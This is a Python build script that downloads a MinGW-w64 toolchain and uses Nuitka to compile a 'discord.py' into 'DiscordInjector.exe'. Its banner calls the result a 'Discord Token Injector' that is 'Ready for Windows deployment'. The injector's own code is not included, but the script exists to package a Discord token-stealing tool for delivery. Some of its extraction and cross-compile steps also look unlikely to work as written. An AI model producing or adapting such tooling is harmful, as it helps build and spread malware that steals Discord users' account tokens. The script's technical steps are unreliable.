#!/usr/bin/env python3
"""
Static cross-compile to Windows using portable MinGW toolchain
Downloads MinGW-w64 and uses it to compile Python with Nuitka
"""
import subprocess
import sys
import os
import urllib.request
import tarfile
import shutil
from pathlib import Path

MINGW_URL = "https://sourceforge.net/projects/mingw-w64/files/Toolchains%20targetting%20Win64/Personal%20Builds/mingw-builds/8.1.0/threads-winpthreads/sjlj/x86_64-8.1.0-release-win32-sjlj-rt_v6-rev0.7z"
MINGW_7Z = "mingw-w64-x86_64.7z"
MINGW_DIR = "./mingw-w64-x86_64"

def download_mingw():
    """Download portable MinGW toolchain"""
    if os.path.exists(MINGW_DIR):
        print(f"[+] MinGW already exists at {MINGW_DIR}")
        return True
    
    print("[*] Downloading MinGW-w64 toolchain...")
    print("[*] This may take a few minutes (~300 MB)")
    
    try:
        urllib.request.urlretrieve(MINGW_URL, MINGW_7Z, reporthook=progress_hook)
        print()
        return True
    except Exception as e:
        print(f"[-] Download failed: {e}")
        return False

def progress_hook(block_num, block_size, total_size):
    """Progress indicator for downloads"""
    downloaded = block_num * block_size
    percent = min(100, (downloaded * 100) // total_size)
    print(f"\r[*] Downloaded: {percent}% ({downloaded/(1024*1024):.1f} MB)", end='', flush=True)

def extract_mingw():
    """Extract MinGW from archive"""
    if os.path.exists(MINGW_DIR):
        return True
    
    print(f"[*] Extracting MinGW...")
    
    try:
        # Try 7z
        subprocess.run(['7z', 'x', MINGW_7Z, f'-o{MINGW_DIR}'], check=True, capture_output=True)
        print(f"[+] Extracted to {MINGW_DIR}")
        return True
    except:
        try:
            # Try tar
            subprocess.run(['tar', 'xf', MINGW_7Z], check=True, capture_output=True)
            print(f"[+] Extracted to {MINGW_DIR}")
            return True
        except:
            print("[-] Failed to extract. Install '7z' or 'tar'")
            return False

def crosscompile_python():
    """Use Nuitka to cross-compile Python to Windows"""
    print("[*] Cross-compiling discord.py to Windows...")
    
    if not os.path.exists(MINGW_DIR):
        print("[-] MinGW toolchain not available")
        return False
    
    cc_path = os.path.join(MINGW_DIR, 'bin', 'gcc.exe')
    if not os.path.exists(cc_path):
        cc_path = os.path.join(MINGW_DIR, 'bin', 'x86_64-w64-mingw32-gcc.exe')
    
    if not os.path.exists(cc_path):
        print("[-] GCC not found in MinGW, trying with system compiler")
        cc_path = 'gcc'
    
    env = os.environ.copy()
    env['CC'] = cc_path
    env['CXX'] = cc_path.replace('gcc', 'g++')
    
    cmd = [
        sys.executable, '-m', 'nuitka',
        '--onefile',
        '--windows-target=x86_64',
        '--mingw64',
        '--no-pyi-file',
        'discord.py'
    ]
    
    try:
        result = subprocess.run(cmd, env=env, check=False)
        
        # Check for output
        possible_outputs = [
            'discord.exe',
            'discord.bin',
            'build/discord.release'
        ]
        
        for output in possible_outputs:
            if os.path.exists(output):
                print(f"[+] Build successful: {output}")
                shutil.move(output, 'DiscordInjector.exe')
                return True
        
        return result.returncode == 0
    except Exception as e:
        print(f"[-] Build failed: {e}")
        return False

def main():
    print("="*60)
    print("Discord Token Injector - Static Windows Cross-Compile")
    print("="*60)
    print()
    
    # Check for Nuitka
    try:
        subprocess.run([sys.executable, '-m', 'nuitka', '--version'], 
                      capture_output=True, check=True)
    except:
        print("[-] Nuitka not installed")
        print("[*] Install: pip install nuitka")
        return 1
    
    # Option 1: Try with Nuitka + MinGW
    print("[*] Attempting native cross-compilation with Nuitka...")
    
    if download_mingw() and extract_mingw():
        if crosscompile_python():
            print()
            print("[+] SUCCESS: DiscordInjector.exe created")
            print("[+] Ready for Windows deployment")
            return 0
    
    print()
    print("[-] Cross-compilation setup incomplete")
    print("[*] Alternative: Use GitHub Actions workflow")
    print("[*] Alternative: Build on native Windows machine")
    return 1

if __name__ == '__main__':
    sys.exit(main())
